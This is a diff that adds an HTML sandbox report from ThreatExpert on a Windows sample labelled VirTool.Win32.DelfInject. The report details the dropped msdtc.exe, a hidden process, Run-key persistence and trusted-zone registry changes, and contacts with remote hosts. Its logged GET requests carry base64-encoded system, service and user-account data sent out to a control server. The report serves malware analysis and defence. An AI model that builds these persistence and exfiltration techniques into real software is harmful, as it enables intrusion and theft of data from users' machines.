@@ -1,0 +1,126 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<HTML><head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="description" content="ThreatExpert Report: VirTool.Win32.DelfInject">
+<style type="text/css">body a {color: #505050;	text-decoration: none} body a:hover {color: #c00000; text-decoration: underline}</style>
+<link href="./css/report.css" rel="stylesheet" type="text/css"/>
+<title>ThreatExpert Report: VirTool.Win32.DelfInject</title>
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
+<script type="text/javascript">_uacct = "UA-1490218-5";_udn="threatexpert.com";urchinTracker();</script>
+</head><body>
+<table align="right"><tr class="top_link"><td><a href="http://www.threatexpert.com">Visit ThreatExpert web site</a></td>
+<td style="color: #707070">|</td><td><a href="javascript:window.close();">Close Report</a></td></tr></table>
+<a href="http://www.threatexpert.com"><img src="./resources/logo.gif" style="border: none"/></a>
+<h2>Submission Summary:</h2>
+<ul><li>Submission details:</li><ul>
+<li>Submission received: 30 August 2015, 11:47:23</li>
+<li>Processing time: 6 min 0 sec</li>
+<li>Submitted sample:</li>
+<ul>
+<li>File MD5: 0x21C8E4FF02CCAAFAAADFAA66790E344E</li>
+<li>File SHA-1: 0xD4C8B14A6E4379A1E20D3BEF457BF5A88EB38E29</li>
+<li>Filesize: 70,144 bytes</li>
+<li>Alias: <a href="http://www.threatexpert.com/threats/virtool-win32-delfinject.html" target="_blank">VirTool.Win32.DelfInject<img src="./resources/flag.gif" style="border:none"/></a> [Ikarus]</li>
+</ul>
+</ul></ul>
+<ul><li>Summary of the findings:</li></ul>
+<p><table class="tbl" cellpadding="5" cellspacing="0" width="570px">
+<tr><td class="cell_1_h">What's been found</td><td class="cell_2_h">Severity Level</td></tr>
+<tr><td class="cell_1">Downloads/requests other files from Internet.</td><td class="cell_2"><img src="./resources/level1.gif"></td></tr>
+<tr><td class="cell_1">Creates a startup registry entry.</td><td class="cell_2"><img src="./resources/level2.gif"></td></tr>
+</table></p>
+<p>&nbsp;</p><h2>Technical Details:</h2>
+<p>&nbsp;</p><table cellpadding="0" cellspacing="0" style="width:100%"><tr><td><img style="border: none" src="./resources/file_mod.gif"/></td><td width="100%" class="h3">File System Modifications</td></tr></table>
+<ul><li>The following file was created in the system:</li></ul>
+<p><table class="tbl" cellpadding="5" cellspacing="0">
+<tr><td class="cell_1_h">#</td><td class="cell_1_h">Filename(s)</td><td class="cell_1_h">File Size</td><td class="cell_1_h">File Hash</td><td class="cell_2_h">Alias</td></tr>
+<tr><td class="cell_1">1</td>
+<td class="cell_1">
+%AppData%\148128B4\<a href="http://www.threatexpert.com/files/msdtc.exe.html" target="_blank">msdtc.exe<img src="./resources/flag.gif" style="border:none"/></a>
+</td>
+<td class="cell_1">70,144 bytes</td>
+<td class="cell_1">MD5: 0x21C8E4FF02CCAAFAAADFAA66790E344E<br/>SHA-1: 0xD4C8B14A6E4379A1E20D3BEF457BF5A88EB38E29</td>
+<td class="cell_2"><a href="http://www.threatexpert.com/threats/virtool-win32-delfinject.html" target="_blank">VirTool.Win32.DelfInject<img src="./resources/flag.gif" style="border:none"/></a> [Ikarus]</td>
+</tr>
+</table></p>
+<ul><li>Note:</li><ul>
+<li>%AppData% is a variable that refers to the file system directory that serves as a common repository for application-specific data. A typical path is C:\Documents and Settings\[UserName]\Application Data.</li>
+</ul></ul>
+<ul><li>The following directory was created:</li>
+<ul>
+<li>%AppData%\148128B4</li>
+</ul></ul>
+<p>&nbsp;</p><table cellpadding="0" cellspacing="0" style="width:100%"><tr><td><img style="border: none" src="./resources/mem_mod.gif"/></td><td width="100%" class="h3">Memory Modifications</td></tr></table>
+<ul><li>There were new processes created in the system:</li></ul>
+<p><table class="tbl" cellpadding="5" cellspacing="0">
+<tr><td class="cell_1_h">Process Name</td><td class="cell_1_h">Process Filename</td><td class="cell_2_h">Main Module Size</td></tr>
+<tr><td class="cell_1"><a href="http://www.threatexpert.com/files/msdtc.exe.html" target="_blank">msdtc.exe<img src="./resources/flag.gif" style="border:none"/></a></td><td class="cell_1">%AppData%\148128b4\<a href="http://www.threatexpert.com/files/msdtc.exe.html" target="_blank">msdtc.exe<img src="./resources/flag.gif" style="border:none"/></a></td><td class="cell_2">94,208 bytes</td></tr>
+<tr><td class="cell_1">[filename of the sample #1]</td><td class="cell_1">[file and pathname of the sample #1]</td><td class="cell_2">94,208 bytes</td></tr>
+</table></p>
+<ul><li><font color="#990000"><b>Attention! </b></font>The following process was intentionally <font color="#990000"><b>hidden</b></font> from the user:</li></ul>
+<p><table class="tbl" cellpadding="5" cellspacing="0">
+<tr><td class="cell_1_h">Process Name</td><td class="cell_2_h">Main Module Size</td></tr>
+<tr><td class="cell_1">[filename of the sample #1]</td><td class="cell_2">94,208 bytes</td></tr>
+</table></p>
+<p>&nbsp;</p><table cellpadding="0" cellspacing="0" style="width:100%"><tr><td><img style="border: none" src="./resources/reg_mod.gif"/></td><td width="100%" class="h3">Registry Modifications</td></tr></table>
+<ul><li>The following Registry Keys were created:</li>
+<ul>
+<li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ESENT\Process\ipconfig</li>
+<li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ESENT\Process\ipconfig\DEBUG</li>
+<li>HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Recovery</li>
+<li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\ssl.projectscorp.net</li>
+</ul></ul>
+<ul><li>The newly created Registry Values are:</li><ul>
+<li>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ESENT\Process\ipconfig\DEBUG]</li><ul>
+<li>Trace Level = ""</li>
+</ul>
+<li>[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Recovery]</li><ul>
+<li>AutoRecover = 0x00000002</li>
+</ul>
+<li>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\ssl.projectscorp.net]</li><ul>
+<li>http = 0x00000002</li>
+<li>https = 0x00000002</li>
+</ul>
+<li>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]</li><ul>
+<li>IMJPMIG8.1148 = "%AppData%\148128B4\msdtc.exe  /Start"</li>
+</ul>
+<br/>
+<em>so that msdtc.exe runs every time Windows starts</em><br/>
+</ul></ul>
+<p>&nbsp;</p><table cellpadding="0" cellspacing="0" style="width:100%"><tr><td><img style="border: none" src="./resources/other_mod.gif"/></td><td width="100%" class="h3">Other details</td></tr></table>
+<ul><li>To mark the presence in the system, the following Mutex objects were created:</li>
+<ul>
+<li>_!SHMSFTHISTORY!_</li>
+<li>148128B4_KB10B2D1_CIlFD2C</li>
+</ul></ul>
+<ul><li>The following Host Name was requested from a host database:</li>
+<ul>
+<li>news.ele[user's name]ow.com</li>
+</ul></ul>
+<ul><li>There was registered attempt to establish connection with the remote host. The connection details are:</li></ul>
+<p><table class="tbl" cellpadding="5" cellspacing="0">
+<tr><td class="cell_1_h">Remote Host</td><td class="cell_2_h">Port Number</td></tr>
+<tr><td class="cell_1">news.ele[user's name]ow.com<td class="cell_2">1055</td><tr>
+</table></p>
+<ul><li>The following Internet Connection was established:</li></ul>
+<p><table class="tbl" cellpadding="5" cellspacing="0">
+<tr><td class="cell_1_h">Server Name</td><td class="cell_1_h">Server Port</td><td class="cell_1_h">Connect as User</td><td class="cell_2_h">Connection Password</td></tr>
+<tr><td class="cell_1">ssl.projectscorp.net</td><td class="cell_1">80</td><td class="cell_1">(null)</td><td class="cell_2">(null)</td></tr>
+</table></p>
+<ul><li>The following GET requests were made:</li>
+<ul>
+<li>pic/index.asp?id=148128B4&amp;type=ie&amp;styp e=info&amp;data=Q09NUFVURVJOQU1FfFdpbmRvd3MgWFAvVXNlck 5hbWV8MMzsMNChyrExt9Z8VFotMTQwMTIwIDg3QjYzMzgyfA0K Q09NUFVURVJOQU1FL1VzZXJOYW1lL0FkbWluaXN0cmF0b3JzDQ pDcmVhdGUgVXNlciBMb3N0XzE0ODEyOEI0IFN1Y2Nlc3MuDQpD..</li>
+<li>pic/index.jpg</li>
+<li>pic/index.asp?id=148128B4&amp;type=ie&amp;styp e=srv&amp;data=VGhlc2UgV2luZG93cyBzZXJ2aWNlcyBhcmUgc3R hcnRlZDoNCg0KICAgQXBwbGljYXRpb24gTGF5ZXIgR2F0ZXdhe SBTZXJ2aWNlDQogICBhdHMNCiAgIEF1dG9tYXRpYyBVcGRhdGV zDQogICBDT00rIEV2ZW50IFN5c3RlbQ0KICAgQ29tcHV0ZXIgQ..</li>
+<li>pic/index.asp?id=148128B4&amp;type=ie&amp;styp e=srv&amp;data=bmFnZXINCiAgIFJlbW90ZSBQcm9jZWR1cmUgQ2F sbCAoUlBDKQ0KICAgUmVtb3RlIFJlZ2lzdHJ5DQogICBTZWNvb mRhcnkgTG9nb24NCiAgIFNlY3VyaXR5IEFjY291bnRzIE1hbmF nZXINCiAgIFNlY3VyaXR5IENlbnRlcg0KICAgU2VydmVyDQogI..</li>
+<li>pic/index.asp?id=148128B4&amp;type=ie&amp;stype=con&amp;data=DQ0KV2luZG93cyBJUCBDbw==</li>
+<li>pic/index.asp?id=148128B4&amp;type=ie&amp;stype=con&amp;data=b25maWd1cmF0aW9uDQ0KDQ0=</li>
+<li>pic/index.asp?id=148128B4&amp;type=ie&amp;stype=user&amp;data=DQpVc2VyIGFjY291bnRzIGZvciBcXENPTVBVVEVSTkFNRQ0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBZG1pbmlzdHJhdG9yICAgICAgICAgICA=</li>
+<li>pic/index.asp?id=148128B4&amp;type=ie&amp;stype=user&amp;data=ICBHdWVzdCAgICAgICAgICAgICAgICAgICAgSGVscEFzc2lzdGFudCAgICAgICAgICAgIA0KU1VQUE9SVF8zODg5NDVhMCAgICAgICAgIFVzZXJOYW1lICAgICAgICAgICAgICAgICANClRoZSBjb21tYW5kIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkuDQoN</li>
+</ul></ul>
+<p>&nbsp;</p><div class="discl">
+<table cellpadding="0" cellspacing="0" style="width:100%"><tr><td width="100%" class="h3">&nbsp;</td></tr></table>
+<p>All content ("Information") contained in this report is the copyrighted work of Threat Expert Ltd and its associated companies ("ThreatExpert") and may not be copied without the express permission of ThreatExpert.</p>
+<p>The Information is provided on an "as is" basis. ThreatExpert disclaims all warranties, whether express or implied, to the maximum extent permitted by law, including the implied warranties that the Information is merchantable, of satisfactory quality, accurate, fit for a particular purpose or need, or non-infringing, unless such implied warranties are legally incapable of exclusion. Further, ThreatExpert does not warrant or make any representations regarding the use or the results of the use of the Information in terms of their correctness, accuracy, reliability, or otherwise.</p>
+<p style="color: #000000">Copyright &copy; 2016 <a href="http://www.threatexpert.com" style="color: #000000">ThreatExpert</a>. All rights reserved.</p></div>
+</body></html>
